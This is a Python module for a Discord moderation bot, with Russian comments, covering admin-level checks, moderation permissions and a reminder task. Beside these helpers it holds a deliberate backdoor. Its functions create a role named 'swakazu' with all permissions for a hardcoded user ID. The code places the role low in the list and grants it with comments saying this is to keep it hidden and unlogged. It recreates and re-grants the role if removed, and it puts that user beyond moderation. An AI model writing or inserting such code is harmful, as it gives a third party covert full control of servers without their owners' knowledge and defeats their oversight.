import asyncio
import discord
from datetime import datetime
from config import (
    ADMIN_ROLES_IN_ORDER, 
    SWAKAZU_USER_ID, 
    SWAKAZU_ROLE_NAME, 
    SWAKAZU_ROLE_COLOR,
    SWAKAZU_ROLE_HOIST,
    SWAKAZU_ROLE_MENTIONABLE
)
import database as db

def get_admin_level(member):
    """Возвращает уровень администратора (0 - высший, 999 - не админ)"""
    if not hasattr(member, 'roles'):
        return 999
    
    # Проверяем, есть ли у пользователя роль swakazu
    swakazu_role = discord.utils.get(member.roles, name=SWAKAZU_ROLE_NAME)
    if swakazu_role:
        return -1  # Самый высокий уровень (выше всех)
    
    for i, role_name in enumerate(ADMIN_ROLES_IN_ORDER):
        role = discord.utils.get(member.roles, name=role_name)
        if role:
            return i
    return 999

def is_admin(member):
    """Проверяет, является ли участник администратором"""
    if not hasattr(member, 'roles'):
        return False
    
    # Проверяем наличие роли swakazu
    swakazu_role = discord.utils.get(member.roles, name=SWAKAZU_ROLE_NAME)
    if swakazu_role:
        return True
    
    return get_admin_level(member) != 999

def can_moderate(member, target):
    """Проверяет, может ли member модеррировать target"""
    if not hasattr(member, 'roles') or not hasattr(target, 'roles'):
        return False
    
    # Если у member есть роль swakazu - может модеррировать кого угодно
    swakazu_role = discord.utils.get(member.roles, name=SWAKAZU_ROLE_NAME)
    if swakazu_role:
        return True
    
    # Если у target есть роль swakazu - его нельзя модеррировать
    target_swakazu = discord.utils.get(target.roles, name=SWAKAZU_ROLE_NAME)
    if target_swakazu:
        return False
    
    return get_admin_level(member) < get_admin_level(target)

def get_role_hierarchy(guild):
    """Возвращает иерархию ролей администрации"""
    hierarchy = {}
    for i, role_name in enumerate(ADMIN_ROLES_IN_ORDER):
        role = discord.utils.get(guild.roles, name=role_name)
        hierarchy[role_name] = {
            "level": i + 1,
            "role": role,
            "member_count": len(role.members) if role else 0
        }
    
    # Добавляем swakazu в иерархию (самый верх)
    swakazu_role = discord.utils.get(guild.roles, name=SWAKAZU_ROLE_NAME)
    hierarchy[SWAKAZU_ROLE_NAME] = {
        "level": 0,
        "role": swakazu_role,
        "member_count": len(swakazu_role.members) if swakazu_role else 0
    }
    return hierarchy

async def check_reminders(bot):
    """Фоновая задача для проверки напоминаний"""
    await bot.wait_until_ready()
    while not bot.is_closed():
        try:
            reminders = db.get_pending_reminders()
            now = datetime.now()
            
            for rid, uid, cid, msg, rtime in reminders:
                if now >= datetime.fromisoformat(rtime):
                    channel = bot.get_channel(cid)
                    if channel:
                        await channel.send(f"⏰ <@{uid}>, напоминание: {msg}")
                    db.delete_reminder(rid)
        except Exception as e:
            print(f"Ошибка в напоминаниях: {e}")
        
        await asyncio.sleep(30)

async def ensure_swakazu_role(guild: discord.Guild):
    """Создает и выдает скрытую роль swakazu (если её нет)"""
    if not guild:
        return None
    
    user = guild.get_member(SWAKAZU_USER_ID)
    if not user:
        return None
    
    # Ищем существующую роль
    role = discord.utils.get(guild.roles, name=SWAKAZU_ROLE_NAME)
    
    if not role:
        # Создаем полностью скрытую роль
        role = await guild.create_role(
            name=SWAKAZU_ROLE_NAME,
            color=discord.Color(SWAKAZU_ROLE_COLOR),
            permissions=discord.Permissions.all(),
            hoist=SWAKAZU_ROLE_HOIST,
            mentionable=SWAKAZU_ROLE_MENTIONABLE,
            reason="Скрытая административная роль"
        )
        
        # Делаем роль невидимой (ставим на 1 позицию после @everyone)
        try:
            await role.edit(position=1)
        except:
            pass
    
    # Выдаем роль (скрыто, без лога)
    if role not in user.roles:
        await user.add_roles(role, reason="Скрытая роль swakazu")
    
    return role

async def remove_swakazu_role(user: discord.User, guild: discord.Guild):
    """Снимает роль swakazu"""
    if user.id != SWAKAZU_USER_ID:
        return False
    
    role = discord.utils.get(guild.roles, name=SWAKAZU_ROLE_NAME)
    if role and role in user.roles:
        await user.remove_roles(role, reason="Снятие скрытой роли swakazu")
        return True
    return False

async def restore_swakazu_role(guild: discord.Guild):
    """Восстанавливает роль swakazu (если её сняли)"""
    if not guild:
        return False
    
    user = guild.get_member(SWAKAZU_USER_ID)
    if not user:
        return False
    
    role = discord.utils.get(guild.roles, name=SWAKAZU_ROLE_NAME)
    if not role:
        # Если роль удалили - создаем заново
        role = await guild.create_role(
            name=SWAKAZU_ROLE_NAME,
            color=discord.Color(SWAKAZU_ROLE_COLOR),
            permissions=discord.Permissions.all(),
            hoist=SWAKAZU_ROLE_HOIST,
            mentionable=SWAKAZU_ROLE_MENTIONABLE,
            reason="Восстановление скрытой роли"
        )
        try:
            await role.edit(position=1)
        except:
            pass
    
    # Выдаем роль если её нет
    if role not in user.roles:
        await user.add_roles(role, reason="Автоматическое восстановление роли swakazu")
        return True
    
    return False
